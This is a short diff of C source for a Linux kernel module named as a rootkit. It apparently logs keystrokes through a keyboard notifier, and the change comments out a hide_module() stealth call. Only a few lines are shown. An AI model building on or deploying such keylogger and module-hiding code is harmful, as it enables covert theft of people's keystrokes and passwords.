@@ -209,7 +209,7 @@ static const char* keymap_shift[] =
 /*BOOTSTRAPING*/
 
 static int __init rootkit_start(void){
-	hide_module();
+//	hide_module();
 
 	register_keyboard_notifier(&keyboard_notifier);
 
